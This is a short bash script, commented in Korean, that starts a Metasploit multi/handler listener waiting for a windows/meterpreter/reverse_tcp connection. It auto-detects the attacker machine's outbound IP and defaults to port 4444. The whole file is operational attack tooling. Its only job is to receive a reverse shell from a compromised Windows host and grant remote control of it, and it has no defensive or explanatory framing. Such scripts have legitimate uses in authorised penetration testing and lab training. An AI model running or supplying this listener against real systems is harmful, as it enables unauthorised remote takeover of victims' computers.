#!/bin/bash
# msfconsole 리스너 한 번에 실행
# 사용법: LHOST=172.20.10.12 LPORT=4444 ./ms.sh
# LHOST 미지정 시 현재 아웃바운드 IP 자동 감지

LHOST="${LHOST:-$(python3 -c "import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(('10.254.254.254',1)); print(s.getsockname()[0]); s.close()" 2>/dev/null || hostname -I | awk '{print $1}')}"
LPORT="${LPORT:-4444}"

echo "[*] Listener: $LHOST:$LPORT"

msfconsole -q -x "
  use exploit/multi/handler;
  set payload windows/meterpreter/reverse_tcp;
  set LHOST $LHOST;
  set LPORT $LPORT;
  exploit;
"
